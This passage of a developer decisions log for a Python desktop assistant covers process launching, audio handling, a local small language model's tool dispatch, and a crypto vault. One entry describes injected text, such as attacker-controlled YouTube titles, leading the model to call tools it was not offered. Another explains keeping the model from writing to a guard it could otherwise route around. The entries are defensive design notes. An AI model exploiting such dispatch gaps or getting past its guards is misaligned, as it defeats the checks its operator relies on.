  from `%SystemRoot%` (`os.path.join(SystemRoot, "System32", "netsh.exe")`),
  bin/'s through Aegis. Windows looks for a bare name in Python's folder and
  the working folder before System32. `test_process_launches` fails a launch
  whose program is a bare constant. Why: §12, 2026-11-17.
- **Every file write, move and delete is listed** in
  `tests/test_file_writes.py`, with the folders it writes in and where its
  path comes from. A new one fails until someone traces its path and adds its
  line. A path built from the network, a config file or the model must be
  checked before anything is written, and a function that hands its path in
  from a caller lists that caller. Why: §12, 2026-10-05.
- **Hide console windows** when spawning external processes:
  `creationflags=subprocess.CREATE_NO_WINDOW`, referenced defensively
  (`getattr(subprocess, "CREATE_NO_WINDOW", 0)`) if the module might be imported
  off-Windows. This suppresses the *console* only — not a GUI window the binary
  opens itself.
- **Neutralize a bundled binary's own user config** — the same instinct as
  anchoring to `__file__` (§1), one level down. If the external tool reads a
  per-user config on the host, disable it so the stack behaves identically
  everywhere. **Trade-off to watch for:** killing a tool's config can disable
  features that key off its config *directory* — `--no-config` switches off mpv's
  default watch-later location, so Morpheus re-supplies it explicitly. If you
  disable a binary's config, audit what else lived there and re-provide it.
- **Binaries resolve `bin/` first, then PATH**, so a portable copy beats a stale
  install.

---

## 12. Decisions & deviations log

Choices that go *against* a convention above, so future readers know they were
intentional. **Decision · why · date.** Append, don't rewrite. **This is where
the reasoning lives** — [`CHANGELOG.md`](CHANGELOG.md) records only what changed
and when, one line per change, so a decision worth keeping must be written here.

- **`emanon.fetch()` / `morpheus.fetch()` never raise** (vs. §2's raise-on-failure
  norm). A watcher that crashes is useless; "nothing playing" is not a fault.
- **`pythia.ask(tool_overrides=...)` swaps a tool's HANDLER for one turn,
  keeping its schema.** A tool's job and a particular caller's PRECONDITIONS are
  different things. `play_music` searches and plays in one call, which is right
  for "play me this song" and leaves a caller that must check something between
  those two steps with nowhere to put the check — by the time the tool returns,
  a song heard an hour ago is already playing. Those checks are also not
  Morpheus's: they are about Awen's history and Awen's idea of a song, and
  moving them into Morpheus would give it a second job (§0). The override is
  per-turn and never mutates `_DISPATCH`, so a chat turn running at the same
  moment still gets the real handler. *(2026-09-16.)*
- **Auto-DJ is OFF at every launch and is not persisted.** It is the one piece
  of Awen's state that could reasonably have gone in `felhaven_settings.json`
  (§9) and deliberately did not: a job that starts playing music by itself
  because of something you did last week is a surprise, not a convenience. The
  cost is one click after a restart. *(2026-09-16.)*
- **DJ turns are stateless and never enter HomePanel's chat history**, in either
  direction. Out, because gemma4:e2b imitates its own transcript — the reason
  that history keeps real tool exchanges at all — and HomePanel's window is
  three turns, so a few songs of patter would evict the operator's actual
  conversation AND teach chat Pythia to talk like a radio host. In, because a
  DJ turn that could see the chat would start answering it. Each turn is built
  fresh from Awen's own prompt plus a message derived from the ledger.
  *(2026-09-16.)*
- **A DJ turn that called no tool says NOTHING**, rather than speaking the
  model's text. Measured 2026-09-16: when gemma4:e2b drops out of tool-calling
  mode it TYPES the call as content — `play_music{query:<|"|>Led Zeppelin
  Stairway to Heaven<|"|>}` — and the same prompt three sentences shorter does
  that 11 times in 12. Speaking it would announce a song that is not playing,
  in a confident voice. The inverse case (a song played, no intro written) gets
  a line built in code from the resolved title, which cannot be wrong.
  *(2026-09-16.)*
- **A tool allowlist is enforced at DISPATCH, not by omitting schemas.**
  `pythia.ask(allow_tools=[...])` narrows both the schema list the model sees
  and the set `_dispatch` will actually run, and the second is the one that
  matters. Leaving a tool out of `tools` is a HINT: `_dispatch` runs any name
  present in `_DISPATCH`, so a model that emits an omitted name anyway would
  have it executed. That is tolerable for chat, where a human is reading the
  transcript and typed the question, and not for an unattended caller feeding
  the model text it did not write — a YouTube title is attacker-controlled
  input in the same sense a web page is. A refused call returns a
  `tool_not_available` slug so the model can recover inside the same turn, and
  is recorded as a failed rite, because a refusal is a real event rather than
  something to drop silently. *(2026-09-16.)*
- **`pythia.is_busy()` is module state, in a module whose docstring says it has
  none** ("no tkinter, no threads, no persistence... a pure request/response
  function"). The counter is the same allowance `_WARMING` already has and for
  the same reason: nothing else could answer the question. HomePanel knows about
  its own turn through `self._thread`, which is a Tk object on the main thread
  and unreachable from a Kairos worker deciding whether now is a good moment to
  take the model. It is a counter rather than a flag because two turns can
  genuinely overlap, and a flag would clear on the first finish and report idle
  while the other was still generating. *(2026-09-16.)*
- **`euterpe.record()` never raises** (vs. §9's persistence norm, where
  `plutus._save_events` raises so the caller can surface it). The difference is
  who is watching. Plutus writes from a Save button with a human in front of it;
  Euterpe writes from a Kairos worker, on a job nobody asked for and nobody is
  looking at, so there is no one to surface it TO — and a disk hiccup must not
  take down the tick or stop the music. The swallow is only defensible because
  of the `log.error` that comes with it, the same bargain `HomePanel._poll`
  made: the failure names itself in `felhaven.log`, where Emanon surfaces it.
  Never add one without the other. *(2026-09-16.)*
- **Euterpe is out of LLM scope, and not for the usual reason.** §2's example of
  the category is a module that mutates real money. This one is a GUARD: the
  no-repeat rule exists to stop a small model replaying a song it likes, so
  giving that model a write handle would let it record its way around the check,
  and a read handle would only make it pay a tool round trip for something Awen
  already puts in the turn's own message. Out of scope because it polices the
  model, not because it is dangerous. *(2026-09-16.)*
- **Whether a track ENDED or FAILED is decided in Python, never read off mpv.**
  Measured 2026-09-16 against mpv v0.41, on a local file and a YouTube URL
  alike: a natural end, a track ended by `next_track()`, and a load that never
  resolved all leave `idle-active True`, `path None`, `playlist-pos -1`,
  `playlist-count 1` — the same four values. The only idle state any property
  separates is a deliberate `stop()`, by `playlist-count 0`.

  So there is no property to branch on, and any future code that thinks it has
  found one is reading a coincidence. `_judge_pending_load` decides it instead,
  from whether a load was ever *confirmed*: media that existed and then stopped
  existing ended; media that never existed failed. This was always the
  docstring's claim — what changed is that it is now measured rather than
  inferred, and that its own test fixtures had been contradicting it (see §10).
  *(2026-09-16.)*
- **`next_track()` sends `playlist-next force`, `prev_track()` keeps `weak`.**
  The asymmetry is deliberate and should not be tidied away. `weak` does nothing
  on the LAST playlist entry, and every single track `play_music` loads is
  exactly that — so ⏭ and `control_music(action="next")` were silent no-ops for
  every track Morpheus plays, while `control_music` still returned the
  post-action status as though the skip had happened, putting the lie into the
  model's context too. `force` ends it, landing in the same shape a natural end
  leaves, which is what lets a caller treat "skipped" and "ended" as one event.

  Backwards has no equivalent destination: running forward off the end of a
  playlist means "this track is over", while running back off the front would
  mean ending playback, which is not what ⏮ says it does. The two differ only on
  the last entry, so walking a real playlist is unchanged either way.
  *(2026-09-16.)*
- **`HomePanel._poll` swallows and logs, and re-arms in a `finally`** (vs. the
  general rule that panels let errors surface). This chain is not just this
  panel's: `_poll` drives `_on_delta`, which is what feeds sentences to
  Calliope. `_arm_poll()` was the last statement in the method, so ONE escaping
  exception stopped the chain permanently — and the symptoms named nothing.
  Narration halted mid-answer, the transcript froze, and Vox End stayed lit
  because `_tick_face` never ran again to clear it, so the whole thing read as
  "narration is broken" rather than "the UI is dead."

  **What made it pathological is that it was silent.** Tk prints a failing
  `after()` callback to stderr, and Felhaven runs under `pythonw.exe`, which
  has no stderr — so nothing reached `felhaven.log` and there was nothing to
  debug from. The swallow is only defensible BECAUSE of the `log.exception`
  that comes with it: the failure now names itself in the log, where Emanon
  surfaces it. Never add one without the other. *(2026-09-08.)*

  **And the log line needs a rate limit, for the same reason it needs to
  exist.** The chain ticks at 16 Hz, so a persistent fault writing a traceback
  every tick is ~3.7 KB/s — measured — which cycles `felhaven.log`'s
  1 MB x 3 rotation in under twenty minutes and shreds the FIRST traceback, the
  only one worth reading. Felhaven gets left running for days at a time, so an
  unattended fault has to cost a trickle. `_note_poll_failure` reports once per
  `_POLL_FAIL_QUIET` with a count of what it stands for. Note the gate is on
  time alone: gating on the count too looks equivalent and is not, because the
  counter resets after each report, so the next tick reads as a first failure
  and the flood survives. *(2026-09-08.)*
- **The one owned output stream is checked for liveness, not assumed.**
  Harmonia opens a single `sd.OutputStream` and keeps it for the app's life —
  that is deliberate and it is what killed the barge-in segfault (§12,
  2026-07-26). What it quietly also meant was that `_ensure_stream` returned
  the cached stream on nothing but `is not None and rate matches`. PortAudio
  can stop a stream underneath you — device change or removal, driver reset,
  another app taking the device in exclusive mode, sleep/resume — and when it
  did, every later `play()` got the corpse and appended to a buffer nothing was
  draining. Narration went silent for the rest of the session, `is_playing()`
  stuck true so Vox End stayed lit, Calliope kept synthesizing perfectly, and
  **nothing was logged**. It took two bug reports to find, and the first one
  sent me hunting the wrong subsystem entirely.

  `_stream_is_live()` reads `closed`/`active`; a backend exposing neither is
  treated as live, because guessing "dead" would reopen on every call. The
  reopen drops whatever was buffered: audio queued against a dead device is
  stale by the time one returns, and replaying it would talk over whatever the
  user asked next.

  **The general lesson is worth more than the fix**: "own it for the process
  lifetime" is a statement about *who may replace it*, never a guarantee that
  it still works. Any long-lived handle to something outside the process —
  a device, a socket, a pipe, a subprocess — needs a liveness check at the
  point of use, and Felhaven is left running for days, so "rare" here means
  "weekly", not "never". *(2026-09-09.)*
- **mpv's scratch log is capped by RESTARTING mpv, from `play()`** — not by
  truncating it, and not from the Kairos tick. `mpv.log` grows ~420 KB per track
  load and Felhaven is left running for days, so one mpv process would grow it
  without limit. Every cheaper option was measured against the shipped binary
  on 2026-09-09 and does not work: `--msg-level` does not lower it (mpv forces
  `--log-file` to at least `-v -v`, so `all=error` and `ytdl_hook=error` both
  leave idle startup at ~14 KB); truncating in place leaves mpv's file offset
  stale, so its next write re-expands the file with a hole of NUL bytes (13,710
  measured); and deleting it while mpv holds the handle does not return the
  space on Windows, it only unlinks the name while the bytes stay charged to
  the open handle. Restarting is the only thing that both truncates the file
  and releases the handle.

  It hangs off `play()` because that is the only call that grows the log, and
  the one moment a restart costs nothing — `loadfile ... replace` was going to
  discard the playlist anyway, and `--save-position-on-quit` keeps the outgoing
  bookmark. Explicitly NOT off `status()`/`fetch()`: those are documented
  READ-ONLY and Kairos drives them every 2 s. A watcher that restarts the thing
  it is watching is not a watcher. *(2026-09-09.)*
- **`duck()`/`unduck()` are write-only, and the restore target is a constant.**
  `duck()` runs on Calliope's release worker — the thread that feeds the audio
  buffer — and `unduck()` runs on the Tk main thread. `_ipc()` without
  `expect_reply` opens, writes and closes; `_get_props()` waits for a reply, and
  its own timeout "cannot interrupt a single `readline()` that is already
  blocking." Reading the pre-duck volume so it could be restored exactly was
  therefore buying accuracy with a stall risk on the two threads that can least
  afford one. There is no accuracy to buy: mpv runs `--no-config`, nothing in
  Felhaven exposes a volume control, and morpheus is the only writer, so the
  value is always 100. **Adding a volume control is what breaks this** — the
  read would have to come back, off both threads. *(2026-09-08.)*
- **Calliope's pre-rendered fillers are gone, and the prebuffer gate became
  unconditional.** The fillers were five canned phrases synthesized once into a
  hash-keyed WAV cache and played 1000 ms after Enter to mask kokoro's synth
  latency. They dragged a per-voice cache (re-rendered on a daemon thread by
  `set_voice()`), a render pass inside `prewarm()`, a one-shot `after()` timer
  with epoch/cancel guards, and a `_real_audio_queued` flag whose only job was
  stopping a late filler from jumping ahead of real speech.

  The gate they masked stays, and now always applies: it used to return at once
  unless `_filler_active`, so removing the fillers would have left it
  unreachable. **The subtlety worth keeping** is that the gate has a second
  release condition — `_turn_ended` — and that is now the only thing standing
  between a one-chunk answer and the full `_PREBUFFER_TIMEOUT`. `_on_done`
  already called `end_turn()`; `home_panel._speak` (the manual speak button)
  did not, because the filler short-circuit had always covered for it. It does
  now. A caller that hands Calliope complete text and skips `end_turn()` will
  stall for six seconds, which is exactly the sort of bug a removed guard
  uncovers rather than causes. *(2026-09-07.)*
- **Narration DUCKS music instead of stopping it**, and `harmonia.tick_yield()`
  rides `HomePanel._poll`'s existing 60 ms chain rather than arming a timer of
  its own (vs. §6, which gives timing to Kairos — this is a passenger on a
  listed exception, not a new one). `harmonia.play()` used to call
  `morpheus.stop()` before buffering any audio, once per chunk. mpv's `loadfile`
  is fire-and-forget, so `play_music` returned `{"now_playing": ...}` while
  yt-dlp was still resolving the URL, and the answer's own first spoken chunk
  killed the resolve 2.36 s later — measured in `logs/mpv/mpv.log`: `loadfile`
  at t=0.223, `stop` at t=2.585, `ytdl_hook: Subprocess failed: killed`.

  **The part worth remembering** is why it had no symptoms. `stop()` clears
  `_pending_load`/`_load_error`, and that clause was written *specifically* so
  the yield could not be misreported as a load failure — so it also swallowed
  the true failure the yield was causing. A tolerance added to silence a false
  positive must be narrowed to the exact condition that is genuinely benign, or
  it will eventually hide the real thing. The clause stays (MorpheusPanel's stop
  button still needs it); only its justification changed.

  Uses mpv's own `volume`, not `ao-volume` (the system mixer). `_ducked` is a
  latch, not a counter — Harmonia has one buffer and one drain, so overlapping
  ducks are unreachable and a counter could only ever leak a permanent duck.
  `--watch-later-options=start` is load-bearing: mpv persists options that
  changed since playback started, and `volume` is in its default set, so without
  it a checkpoint taken while ducked would bake `volume=30` into that track's
  resume file for good. *(2026-09-07.)*
- **`MorpheusPanel` spawns a daemon thread** (vs. §6's "no panel spawns threads").
  The `yt-dlp` search blocks for seconds and Kairos has no request-driven slot.
  Mitigated by the queue-only contract + a single-flight guard. *(2026-06-10.)*
- **A full exit clamps Plutus's cost to exactly 0/0**, which is correct but makes
  a re-entry-after-*full*-exit test structurally blind to the average-cost sell
  rule — the clamp launders away any bad cost before the re-buy. So the sell rule
  is pinned with a **partial**-sell re-entry instead. Lesson for any future
  basis/re-entry test: a partial sell catches bugs a full exit hides.
  *(2026-06-10.)*
- **The Register's feed is `format: "rss"` despite a `.atom` URL** — it actually
  serves RSS 2.0. Don't "correct" the mismatch.
- **Naming scheme is historical + mythological.** Historical figures of the
  classical world are in-bounds alongside deities; the names still enforce
  single-responsibility, and "goddess of X" was never the rule. *(2026-07-01.)*
- **`aura._build()` grew `cloud_cover_pct`** for Hypatia's observing conditions —
  Aura stays the single sky-data fetcher; Hypatia reads, never fetches weather.
  *(2026-07-01.)*
- **`tools/kepler.py` imports a sibling tool module** (`from tools import
  hypatia`) to reuse `_julian_date`/`_altaz` rather than duplicate them. Safe
  because both bind the *module object* and only touch the other's attributes
  inside function bodies, never at their own top level — Python's
  partial-module-in-`sys.modules` behavior makes that import order-independent.
  Needs a `sys.path` insert gated behind `if __name__ == "__main__"` for
  standalone runs. *(2026-07-01.)*
- **`theme.PhosphorScroll` replaces `tk.Scrollbar` everywhere** — necessity, not
  taste: on Windows `tk.Scrollbar` is rendered by the native theme engine and
  silently ignores `bg`/`troughcolor`/`activebackground`. The proof is in this
  repo's history — Midas's ledger passed a complete theming kwarg set and Windows
  discarded it. **Do not "simplify" back to `tk.Scrollbar`; the gray bars will
  return.** Drop-in contract (`set(first, last)` + `command=`). *(2026-07-02.)*
- **`cerberus.py` deliberately bundles four facets** (PIN verification, Vault
  encryption, Ledger, Custody manifest) vs. §0. They share one PIN, one KDF, and
  one RAM-only session — facets of a single identity, not four jobs. It is the
  toolbox's **sole** encryption implementation; future consumers call into it
  rather than rolling their own. **Crypto is stdlib only** (§11): PBKDF2 for the
  key, HMAC-SHA256 counter-mode + encrypt-then-MAC at rest, sized to the threat
  model (casual snooping, not a determined attacker). The verify hash and the
  encryption KDF use **separate salts in separate files** on purpose.
  *(2026-07-06.)*
- **`tools/callimachus.py` is the first multi-tool module** (plural
  `TOOL_DEFINITIONS`, §2/§3) and the first tool wired into Pythia's registry only.
  Its Brave key lives in the Cerberus Vault, read at call time — so web search
  works only in a session where Cerberus was unlocked; a locked vault degrades to
  an error, never a crash. Wiring a `tools/` module to `cerberus.py` pulled the
  guardian into the `mypy --strict tools/` graph and surfaced 9 latent annotation
  errors, fixed in lockstep. *(2026-07-07.)*
- **Themis owns settings; the PIN files became per-user.** `aura`/`hypatia`/`horai`
  read Themis **at fetch time**, not import time, so a Settings edit applies on the
  next tick, and `Kairos.refetch(*names)` lets Save nudge them immediately.
  `felhaven_settings.json` is gitignored **even though it's config** — the whole
  point is not to ship the author's location (§9). Units are additive: Aura still
  emits canonical `temp_f` and now also `temp_c`; the display layer picks, so Aura
  stays a pure fetcher. `AURA_LOCATION` became an env *override*, not the source of
  truth. The Sphynx/Cerberus PIN files are no longer shipped — first run walks you
  through setting your own. *(2026-07-10.)*
- **Voice input retired; Calliope refactored to output-only TTS.** *Why:* voice
  input was the only untrusted command surface — the sole reason a keyword router
  had a frozen 9-tool allowlist and a second registry existed. Remove it and there
  is nothing to route or guard, so three registries collapsed to Pythia's one.
  Also dropped torch/faster-whisper for kokoro-onnx. *(2026-07-10.)*
- **`harmonia.py` owns the audio device** — a new "Device / infrastructure
  authority" flavor (§2). Three things wanted to make sound and nothing owned the
  device; **a lock across them cannot work**, because a Python mutex serializes
  *commands*, not *audio*, and mpv holds its own device handle in a separate
  process regardless. `play()` calls `morpheus.stop()` first, one direction only.
  **Deliberate behavior change:** `harmonia.stop()` calls `sd.stop()`, so barge-in
  is instant — and because Harmonia has no channels, a new question also silences
  an in-progress Orpheus briefing. That is the intended cost of one stream, one
  truth. *(2026-07-16.)*
- **Correction: Orpheus shipped decoding at 48 kHz stereo instead of 24 kHz
  mono** — 4× the RAM for zero new information (measured: 147 MB vs 37 MB on a
  real 6m41s file). The code matched its written handoff exactly; the handoff was
  stale, because an amendment was given conversationally and never reached the
  doc. **A process gap, not a judgment error** — and `harmonia.py`'s docstring
  repeated the same wrong number, so it couldn't have caught it. The constants are
  now framed as what they are: Orpheus's explicit *assumption* that `local_audio/`
  holds only Echo's output. *(2026-07-17.)*
- **Cerberus's session is now shared across tabs.** Reading the Finnhub key at
  call time forced Midas's gate off `verify()` (a bare hash check) onto `unlock()`
  (a real session) — and since the session key is module-level, unlocking either
  the Midas gate or the Cerberus tab opens both. "One guardian, one session" is
  more consistent with Cerberus's sole-authority role than the split it replaced,
  but it is a real behavior change: any future Vault-reading gate must call
  `unlock()`, not `verify()`, and must add a liveness check on its own tick to
  re-seal if the session dies elsewhere. *(2026-07-17.)*
- **Correction: five tools were promoted to brain tools and this file didn't say
  so.** `argus`, `helios`, `selene`, `ammit`, and `hypatia` gained real contracts
  on 2026-07-06; their docstrings were fixed the next day (`41fac5f`) but §2, §8,
  and `README.md` kept describing them as excluded for ~two weeks. **The process
  lesson:** the docstrings were fixed and the conventions weren't, because nothing
  linked them — a code-local fix felt complete. A hand-maintained copy of a list
  that changes will drift. *(2026-07-20.)*
- **The output guard now rejects `f"slug: {exc}"`** — a literal slug head no
  longer excuses splicing the caught exception in after it; that is `str(exc)`
  behind a hat. Found in session 1 of the walkthrough, amended in session 2.
  Deliberately narrow: only a bare `{exc}` / `{str(exc)}` is flagged, because
  `{exc.detail}` (zeno's own class, safe by construction) and `{exc.reason}`
  (a foreign message) are indistinguishable statically — attribute reads stay a
  human-audit concern on each module's session. The amendment immediately
  caught `herodotus` interpolating `OSError`s (archive paths on screen) —
  the §2 *reference implementation*, which is exactly why the rule is a test
  and not a sentence in this file. Herodotus and callimachus sit in the
  allowlist until sessions 12/13. *(2026-07-23.)*
- **Docs trimmed to one job per layer; module inventories deleted rather than
  corrected.** The entry above prescribed treating a promotion as a three-file
  change "until something enforces it." Enforcing it is the better answer, so the
  copies were removed instead: §2 and §8 no longer list which modules are brain
  tools, the per-module pages became fixed 5-field stubs, and
  `tests/test_pantheon_docs.py` now asserts the docs match `pythia._TOOL_MODULES`
  and `_DISPATCH`. **The standing rule:** if a line asserts something derivable
  from the code, delete it or generate it — prose can only be wrong about that.
  *(2026-07-20.)*
- **`midas.fetch()` does not raise when every ticker failed *only* because the
  Cerberus vault is locked** (vs §2's raise-on-total-failure). A sealed vault is
  the normal pre-unlock state — the panel starts sealed and Kairos polls Midas
  every 60 s regardless — so raising it wrote an ERROR each minute (609 in one
  live log) and made Emanon read Midas as *failed*. Genuine failures
  (`no_key`/`fetch_failed`/`no_data`) still raise, and the message now names the
  dominant slug (`all tickers failed: no_key`) so the log says *why*. Found in
  walkthrough session 7, next to a worse sibling: `_fetch_one` logged the raw
  request exception, whose URL carries `?token=<finnhub key>`, so the
  Vault-protected key was leaking into `logs/*.log` (which Emanon renders on
  screen). Now it logs `type(e).__name__` + the HTTP status only — never the
  message. The output-contract guard (`test_tool_output_contract.py`) inspects
  `{"error": …}` return values, not `log.*()` calls, so it could not have caught
  this; a log-call scan is a possible future guard, flagged for the logging
  session. *(2026-07-24.)*
- **Cerberus's Ledger is shared mutable state across threads, guarded by its own
  lock — a second shared channel §6 doesn't name.** §6 says the Kairos result
  queue is the *only* object shared between worker threads and the main thread,
  but Midas reads the Finnhub key from a `ThreadPoolExecutor(max_workers=5)`
  inside its `fetch()`, and every `vault_get` logs a Ledger entry — so up to five
  worker threads (plus the panel, on the main thread) do a load-modify-write on
  `cerberus_ledger.json` at once. The old `_ledger_write` was a bare
  `open("w")` truncate+rewrite with no lock: interleaved writes corrupted the
  file (a reader caught it mid-truncate → `Expecting value: line 1 column 1`; two
  writes clobbered → `Extra data`) and racing count-bumps were lost, all visible
  in `metis.log`. Fix: a module-level `_LEDGER_LOCK` around the whole
  load→mutate→write (including the `_SESSION_READS` dedupe check-then-set), and
  all of Cerberus's files now write atomically (tempfile + `os.replace`, §9) so a
  lockless reader still never sees a half-written file. The Vault stays
  lock-free — the pool only *reads* it; `vault_set` is main-thread/CLI only —
  but its write is atomic too, for §9 crash-safety (it holds the actual
  secrets). This doesn't break §6's model: worker threads still touch no Tk
  object and reach the main thread only through the queue; the Ledger is a
  private file each caller serializes on, not a hand-off channel. Found and fixed
  in walkthrough session 8. *(2026-07-24.)*
- **§6 narrowed: a single one-shot `after()` for transient UI feedback is no
  longer a deviation.** The rule had quietly accumulated harmless one-shot timers
  — MorpheusPanel's two-click-remove confirm reset, its status-line and glyph
  auto-clears (flagged walkthrough s17), and HomePanel's latency-masking filler
  (since removed, 2026-09-07) — all of which fire once on the main thread and
  touch only their own panel's
  widgets. The hazards §6 actually guards are background threads and standing
  poll/timing loops, so the rule now targets those. Threads and
  self-re-arming/persistent `after()` work stay documented exceptions: HomePanel's
  per-question worker + 60 ms poll (added this session — the §6 IOU standing since
  walkthrough s6), Echo's drain chain, Emanon's blink chain, Morpheus's search
  thread. Retires the s17 MorpheusPanel flag. *(2026-07-26.)*
- **Harmonia owns one persistent `sd.OutputStream`; barge-in is a buffer flush,
  not `sd.stop()`.** The 2026-07-16 entry above had `harmonia.stop()` call
  `sd.stop()` for instant barge-in. That used sounddevice's module-level
  convenience functions — `sd.play()`/`sd.wait()` on the play worker, `sd.stop()`
  on the UI thread — which share ONE global PortAudio stream and are documented as
  unsafe for concurrent multithreaded use. Barge-in (a new question asked while
  narration was still speaking) raced them and **segfaulted the process with no
  traceback, no log, and no OOM dialog** — diagnosed from that exact silent-vanish
  signature, not from a repro. Harmonia now owns a single `sd.OutputStream`, opened
  once and left running; a callback pulls PCM from an internal lock-guarded buffer,
  `play()` appends, and `stop()` clears it. The callback (PortAudio's own thread) is
  the ONLY consumer of audio, so no two threads ever touch the device API at once.
  Barge-in goes from truly-instant to near-instant — silence within ~the stream's
  device latency (a moderate `_LATENCY` chosen so the memcpy-only callback rides out
  CPU starvation without underrunning) — a tiny, imperceptible trade to remove a
  hard crash. The old queue + play-worker thread + module `_epoch` are gone; stop()
  clearing the buffer under the lock is what discards stale audio now. *(2026-07-26.)*
- **`HomePanel._history` stores each turn's real tool exchange, not flattened
  prose, and windows it to 3 turns.** Symptom: Pythia (gemma4:e2b, a 2B model)
  reliably lost tool use after ~3 tool-calling turns in a session, degrading to
  narrating intent ("I need to call the get_weather tool") or hallucinating an
  answer instead of ever calling a tool again. Root cause: `pythia.ask()`'s
  intra-turn loop builds a correct `user → assistant(tool_calls) → tool(result)
  → assistant(answer)` exchange, but only the flattened `{user, assistant}` pair
  survived into the persisted history — every tool_call and tool result was
  discarded at the end of each turn. A small model imitates its own transcript;
  a history of prose-only turns taught it that questions get answered without
  calling anything, and the effect compounded turn over turn. Fix: `pythia.ask()`
  now reports `turn_messages` (this call's own messages, tool exchange included)
  on its stats event; `HomePanel` persists that verbatim, one list per turn, and
  keeps only the last 3 (`_MAX_HISTORY_TURNS`) so an occasional bad turn ages out
  instead of compounding. Not a §2/§6 deviation — a bugfix to what "the
  conversation" means when a tool-calling model reads its own history back.
  *(2026-07-29.)*
- **Pheme owns read state; no separate deity was minted for it.** The Scrapstream
  restructure needed a seen-set shared by both surfaces, and the obvious
  Anti-Legion reading — one job per module, so read state is its own module —
  is the wrong one here. Read state is an attribute OF a headline: meaningful
  only next to one, derived from a story's URL, with exactly one consumer. A
  module for it would have no independent job, and would hand Pheme a
  shared-state coupling back to itself across a file boundary. So `tools/pheme.py`
  gained `read_key`/`read_keys`/`mark_read` and its `Job:` line was left
  unchanged: the module still aggregates headlines, and now remembers which ones
  you opened. The panel keeps presentation only — merge order, the per-source
  cap, collapse state, dimming. *(2026-08-02.)*
- **Read-state identity strips a DENYLIST of tracking parameters, not the whole
  query string.** Blanket query-stripping is the obvious normalization and it is
  wrong for the shipped feeds: a Hacker News text post (Ask HN / Show HN) carries
  its entire identity in the query — `news.ycombinator.com/item?id=NNNNN` — so
  dropping every parameter collapses every text post onto one key, and reading
  one would dim every other. That is news the user has never seen, silently
  greyed out. BBC pulls the other way: it appends `at_medium`/`at_campaign` to
  every link, which must go or the same story keys differently between fetches.
  The denylist (`_TRACKING_PARAMS` + any `utm_` prefix) satisfies both. Its cost
  is that an unrecognized non-tracking parameter re-brightens an item once —
  cosmetic, and deliberately preferred over a silent collision. The key is the
  URL alone, never url+title, so a corrected headline doesn't re-brighten.
  *(2026-08-02.)*
- **Pheme keeps the parsed datetime as `ts`, and `handle()` strips it back out.**
  `_short_date()` built a `datetime` and discarded everything but "Jul 24" one
  line later, which is why the Brain's merge was round-robin: there was nothing
  to sort on. A day-level key across seven feeds is a wall of ties with arbitrary
  intra-day order, so the sort key had to be the full timestamp. `_parse_date()`
  now returns what the feed wrote and two thin formatters split off it —
  `_short_date()` (display, in the feed's own zone, unchanged behavior) and
  `_timestamp()` (sort, always UTC). Naive datetimes are assumed UTC rather than
  left naive: comparing naive against aware raises `TypeError`, and the river
  sorts across feeds that need not agree about offsets. `ts` is a fixed-width
  string, not a `datetime`, so the Kairos payload stays JSON-serialisable (§9)
  and `""` (undated) sorts last under `reverse=True`. `handle()` strips the key
  before returning — the Brain's story shape is deliberately untouched.
  *(2026-08-02.)*
- **Celestarium became a *grouped row*, not a tab in a host panel.** A tab reads
  as part of a panel, and these are first-class destinations. The mechanical
  payoff is larger than the visual one: `HypatiaPanel` stays a `Card` and
  `felhaven.py` needed no edit at all. A tab body must be a plain `tk.Frame` (a
  `Card` inside a `Card` double-borders), so hosting it would have meant demoting
  the panel and reaching *through* the host for its two Kairos registrations and
  its `rescale()`. A grouped row changes only how the rail is drawn. Group
  headers keep the ordinary bordered-card chrome — the rail has to read as one
  column — and stay distinguishable by the ▼/▶ glyph in the dot's slot plus a
  label that never lights green. *(2026-08-08.)*
- **Groups are collapsed on open (§7), and `set_active()` force-expands.** The
  collapsed default is what keeps the rail inside the window: collapsed, a group
  costs one row however many children it holds, so the rail stops growing with
  the view count. The force-expand is the necessary counterpart — a lit row
  hidden inside a collapsed group would leave the nav lying about where you are.
  *(2026-08-08.)*
- **The Artemis chart draws from TIGER/USGS, not OpenStreetMap — a licensing
  call, not a technical one.** OSM has what TIGER lacks (trails, two-tracks,
  surface type, gates) and would be the better map; it is also ODbL
  share-alike, a knot against an MIT repo meant to be cloned. TIGER/Line and
  USGS products are public domain, so the stack stays clean end to end. The
  cost — weak trail coverage, not-survey-grade geometry — is accepted and
  stated in the panel footer. The layer modules keep the fetch/parse/normalize
  seams separate so an OSM adapter stays possible without an architectural
  change; it is architecture now, implementation later or never. *(2026-08-09.)*
- **Artemis render operations never perform network I/O; ingest always does.**
  The API shape is the enforcement: each layer exposes `ingest()` (online,
  slow, explicit, writes into `<area>.partial/` promoted by one `os.replace`)
  and `load()` (offline, pure read) — and `load()` on a missing cache RAISES;
  it does not helpfully fetch. The failure mode being guarded is a reader that
  quietly grows an `if not cached: fetch()` branch eighteen months from now,
  which would make the offline field case dependent on a connection exactly
  when it matters. A socket-seam test hardening this is planned with the
  search milestone. *(2026-08-09.)*
- **Terrain is best-effort inside an otherwise all-or-nothing ingest.** Roads
  and water failing aborts the area — a chart missing its road network is not
  a chart. Elevation is different: it is the only layer behind an API key, and
  failing the whole ingest over a sealed vault or an absent OpenTopography key
  would mean a user without a key loses the roads-and-water map that shipped
  before terrain existed. So `ingest_area` catches `IngestError` from Demeter
  alone, commits the area without it, and records `terrain_skipped: <slug>` in
  the manifest so the panel says what is missing instead of implying a flat
  county. Cancellation is explicitly NOT absorbed — it propagates and discards
  the partial, or a cancelled ingest would commit a half-area. *(2026-08-09.)*
- **The Artemis palette is the one place hue carries meaning, and it lives in
  two files on purpose.** §7's rule is that colours come from `theme.C`, and
  the theme deliberately folds its accents into a monochrome phosphor ramp. A
  map cannot: terrain, water and roads have to be told apart at a glance, so
  the `map_*` keys introduce cyan and amber (near-complementary, and the set
  survives common red-green colour deficiencies), with nothing reaching text
  brightness so the phosphor still reads on top. The three terrain colours
  then exist *twice* — `theme.C` for the panel's vectors and RGB tuples in
  `tools/demeter.py`, which renders the raster headless and must not import
  Tk. Duplication is the lesser evil against dragging Tk into `tools/`;
  `tests/test_artemis_palette.py` holds the two in lockstep so they cannot
  drift silently. *(2026-08-09.)*
- **The terrain raster is resampled to the canvas, not zoomed by Tk.**
  `PhotoImage` rescales only by integer factors, and the cached raster is
  1024² over the ingest square: at native scale the 5-mile ring is ~931 px
  (overflowing a typical canvas) and at `subsample(2)` it is ~465 px in an
  ~810 px canvas, wasting half the view. Either way the vectors would have to
  adopt the raster's scale and the map would stop filling the panel. So the
  panel nearest-neighbour-samples the cached PPM to exactly the drawable span
  once per area change or debounced resize — a few hundred ms, rare — and the
